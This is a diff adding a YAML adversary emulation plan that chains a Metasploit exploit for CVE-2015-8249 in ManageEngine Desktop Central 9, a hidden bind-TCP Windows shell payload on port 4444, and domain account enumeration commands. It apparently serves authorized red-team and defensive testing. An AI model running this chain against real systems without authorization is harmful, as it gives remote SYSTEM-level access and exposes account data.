@@ -1,0 +1,118 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-10 23:29:36 UTC+0000
+attack_action_sequence:
+  - uuid: de6091de-bce3-456d-bf1e-0a88936f06ed
+    name: ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
+    id:
+      - T1203
+      - T1068
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - Windows
+    tactics:
+      - Execution
+      - Privilege Escalation
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation for Privilege Escalation
+      - Exploitation of Remote Services
+    description: |-
+      This module exploits a vulnerability found in ManageEngine Desktop Central 9. When uploading a 7z file, the FileUploadServlet class does not check the user-controlled ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to inject a null bye at the end of the value to create a malicious file with an arbitrary file type, and then place it under a directory that allows server-side scripts to run, which results in remote code execution under the context of SYSTEM. 
+       Please note that by default, some ManageEngine Desktop Central versions run on port 8020, but older ones run on port 8040. Also, using this exploit will leave debugging information produced by FileUploadServlet in file rdslog0.txt. 
+       This exploit was successfully tested on version 9, build 90109 and build 91084.
+    testbed:
+      CVE:
+        - CVE-2015-8249
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("windows/http/manageengine_connectionid_write")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 8020
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      DOMAIN:
+        CurrentSetting: WORKSTATION
+        Required: true
+        Description: The domain to use for Windows authentication
+      TARGETURI:
+        CurrentSetting: /
+        Required: true
+        Description: The base path for ManageEngine Desktop Central
+  - uuid: c53be697-994f-44ec-b052-3509dda2c489
+    name: Windows Command Shell, Hidden Bind TCP Stager
+    id:
+      - T1059.003
+      - T1105
+      - T1571
+    source: Metasploit Payload
+    supported_platforms:
+      - Windows
+    tactics:
+      - Execution
+      - Persistence
+      - Command and Control
+    technique:
+      - 'Command and Scripting Interpreter: Windows Command Shell'
+      - Ingress Tool Transfer
+      - Non-Standard Port
+    description: |-
+      Spawn a piped command shell (staged).
+      Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("windows/shell/bind_hidden_tcp")
+    arguments:
+      AHOST:
+        CurrentSetting: ''
+        Required: true
+        Description: IP address allowed
+      EXITFUNC:
+        CurrentSetting: process
+        Required: true
+        Description: "Exit technique (Accepted: '', seh, thread, process, none)"
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+      RHOST:
+        CurrentSetting: ''
+        Required: false
+        Description: The target address
+  - uuid: 6fbc9e68-5ad7-444a-bd11-8bf3136c477e
+    name: Enumerate all accounts (Domain)
+    id:
+      - T1087.002
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique:
+      - 'Account Discovery: Domain Account'
+    description: |
+      Enumerate all accounts
+      Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        net user /domain
+        net group /domain
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2015-8249
